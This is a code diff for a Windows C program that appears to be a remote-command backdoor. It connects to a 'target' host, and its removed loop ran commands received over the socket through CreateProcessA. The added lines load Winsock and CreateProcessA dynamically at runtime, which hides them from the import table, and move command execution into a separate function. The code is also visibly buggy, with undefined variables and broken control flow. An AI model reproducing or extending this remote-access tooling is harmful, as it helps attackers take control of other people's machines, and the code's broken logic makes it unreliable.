@@ -7,7 +7,8 @@ struct functionaddr GetFunctionVA(struct functionaddr* funcVA)
     funcVA->function_connect = DynamicFunctionLoad("ws2_32.dll", "connect");
     funcVA->function_WSAcleanup = DynamicFunctionLoad("ws2_32.dll", "WSACleanup");
     funcVA->function_WSAstartup = DynamicFunctionLoad("ws2_32.dll", "WSAStartup");
-
+    funcVA->function_process = DynamicFunctionLoad("kernel32.dll", "CreateProcessA");
+    
     return funcVA;
     
 }
@@ -48,12 +49,17 @@ pClientCTX CliInit(const char* inetaddr, const int port)
 
 }
 
-SOCKET client_socket(struct functionaddr* funcVA)
+SOCKET client_socket(const struct functionaddr* funcVA)
 {
     
-    if (funcVA == NULL) { return INVALID_POINTER }
+    errcode status;
+    if (funcVA == NULL)
+    {
+        status = INVALID_POINTER;
+        return status;
+    }
 
-	SOCKET Socket = funcVA->function_socket();
+	SOCKET Socket = funcVA->function_socket(AF_INET, SOCK_STREAM, 0);
 	if(Socket == INVALID_SOCKET)
 	{
 		fprintf(stderr, "\nfailed to create a socket %d", WSAGetLastError());
@@ -65,10 +71,11 @@ SOCKET client_socket(struct functionaddr* funcVA)
 
 }
 
-SOCKET client_conn(SOCKET Socket, pClientCTX CTX)
+SOCKET client_conn(SOCKET Socket, pClientCTX CTX, const struct functionaddr* funcVA)
 {
-
-	if (connect(Socket, CTX->dstaddr, (int)sizeof(CTX->dstaddr)) != 0)
+    
+    int result = funcVA->function_connect(Socket, CTX->dstaddr, (int)sizeof(CTX->dstaddr));
+	if (result != 0)
 	{
 
 		fprintf(stderr, "\n\afailed to connect to target %d.", WSAGetLastError());
@@ -77,7 +84,6 @@ SOCKET client_conn(SOCKET Socket, pClientCTX CTX)
 		WSACleanup();
 
 		return Exit;
-
 	}
 
 	free(CTX);
@@ -85,54 +91,31 @@ SOCKET client_conn(SOCKET Socket, pClientCTX CTX)
 
 }
 
-int execmd(SOCKET Socket)
+int execute(const char* process, const struct functionaddr* funcVA)
 {
-
-	char rbuff[1024];
-	char sbuff[1024];
 
 	STARTUPINFO SINFO;
 	PROCESS_INFORMATION PINFO;
+    
+    BOOL result = funcVA->function_process(
+        NULL,
+        process,
+        NULL,
+        NULL,
+        False,
+        0,
+        NULL,
+        NULL,
+        &SINFO,
+        &PINFO
+    );
+    if (result > 0)
+    {
+        printf("\nexecuted command");
+    }
 
-	while (1)
-	{
+    fprintf(stderr, "failed to execute commad %d", GetLastError());
 
-		int recvb = recv(Socket, buff, sizeof(rbuff)-1, 0);
-		if (recb == 0)
-		{
-			Sleep(500);
-			break;
-			return Exit;
-		}
-
-		if (bytes == SOCKET_ERROR)
-		{
-			printf("recv failed: %d\n", WSAGetLastError());
-			break;
-		}
-
-		rbuff[recvb] = '\0';
-
-		if (CreateProcessA(
-			NULL,
-			rbuff,
-			NULL,
-			NULL,
-			False,
-			0,
-			NULL,
-			NULL,
-			&SINFO,
-			&PINFO
-		) > 0)
-		{
-			printf("\nexecuted command");
-		}
-
-		fprintf(stderr, "failed to execute commad %d", GetLastError());
-
-		return 0;
-
-	}
+	return 0;
 
 }
